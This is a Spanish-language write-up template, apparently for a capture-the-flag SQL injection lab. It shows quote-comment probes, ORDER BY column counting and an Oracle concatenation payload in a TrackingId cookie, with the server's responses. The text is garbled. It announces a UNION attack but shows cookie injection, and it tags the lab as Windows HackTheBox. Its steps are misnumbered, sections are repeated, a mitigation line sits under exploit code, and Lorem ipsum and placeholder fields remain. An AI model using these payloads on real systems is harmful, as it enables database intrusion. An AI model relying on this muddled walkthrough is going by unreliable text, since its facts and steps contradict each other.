---
title: "validacion"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "validacion"
author: "Z4k7"
date: "2026-03-09"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "WebSecurity"
  - "UnionAttack"
  - "WebAppLab"
  - "ProductFilter"
  - "Media"
techniques:
  - "Completar manualmente"
tools:
  - "Completar herramientas"
flags_list:
  - label: "Usuario"
    value: "xxxxx"
  - label: "Password"
    value: "xxxxx"
  - label: "Usuario"
    value: "xxxxx"
summary: "La vulnerabilidad de inyección SQL (SQLi) ocurre cuando una aplicación web construye consultas dinámicas sin sanitizar adecuadamente la entrada del usuario. En este laboratorio, el parámetro de categoría de productos es vulnerable, permitiendo manipular la consulta SQL original.   El ataque UNION-based SQLi aprovecha la capacidad de combinar resultados de múltiples consultas, lo que permite extraer información sensible de otras tablas como users."
steps:

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Usuario"
        value: "xxxxx"
      - label: "Password"
        value: "xxxxx"

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Se puede usar un ataque UNION para recuperar los resultados de una consulta inyectada.
          Para resolver el laboratorio, muestre la cadena de versión de la base de datos.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se prueba la inyección con '-- para verificar errores de sintaxis
          Esto confirma que la entrada se concatena directamente en la consulta SQL.
      - kind: "image"
        src: "Pasted image 20260301201459.png"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "danger"
        label: "Evidencia Técnica"
        text: "La respuesta del servidor muestra un error de sintaxis, validando que la entrada del usuario se inserta sin sanitización en la consulta SQL."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          1. Determinar número de columnas con ORDER BY:
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
          HTTP/2 500 Internal Server Error
          Content-Type: text/html; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 2330
      - kind: "image"
        src: "Pasted image 20260302180217.png"
        caption: "Evidencia técnica"

  - id: "exploit_2"
    num: ""
    content:
      - kind: "note"
        text: |
          4.Errores SQL visibles en la aplicación.
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2,3-- -- Éxito 
          '+ORDER+BY+1,2,3,4-- -- Error
      - kind: "image"
        src: "Pasted image 20260304190432.png"
        caption: "Evidencia técnica"

  - id: "exploit_3"
    num: ""
    content:
      - kind: "note"
        text: |
          3. Como mentor, destaco que este laboratorio es un ejemplo clásico de SQL Injection en Oracle.
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'||(SELECT'')||'; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
          HTTP/2 500 Internal Server Error
          Content-Type: text/html; charset=utf-8
      - kind: "image"
        src: "Pasted image 20260301132050.png"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          *

  - id: "exploit_4"
    num: ""
    content:
      - kind: "note"
        text: |
          2. Implementar prepared statements y consultas parametrizadas.
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'--; session=uoy0rMCY9vnYm49GWGsXBTsftkRPbpeA
          HTTP/2 200 OK
          Content-Type: text/html; charset=utf-8
          X-Frame-Options: SAMEORIGIN
          Content-Length: 1141

  - id: "recon"
    num: "04"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se prueba la inyección con '-- para verificar errores de sintaxis
          Esto confirma que la entrada se concatena directamente en la consulta SQL.

  - id: "flag_02"
    type: "flag"
    flag_items:
      - label: "Usuario"
        value: "xxxxx"

  - id: "recon"
    num: "05"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se prueba la inyección con '-- para verificar errores de sintaxis
          Esto confirma que la entrada se concatena directamente en la consulta SQL.
      - kind: "callout"
        type: "danger"
        label: "validacion"
        text: "Lorem ipsum dolor sit amet validdacionm validacion"
      - kind: "note"
        text: |
          2. Implementar prepared statements y consultas parametrizadas.
      - kind: "callout"
        type: "warning"
        label: "validacion"
        text: "Lorem ipsum dolor sit amet validdacionm validacion"
      - kind: "note"
        text: |
          2. Implementar prepared statements y consultas parametrizadas
      - kind: "callout"
        type: "tip"
        label: "validacion"
        text: "Lorem ipsum dolor sit amet validdacionm validacion"

lessons:
  - "Completar lecciones aprendidas"
mitigation: "Completar mitigaciones recomendadas."
---
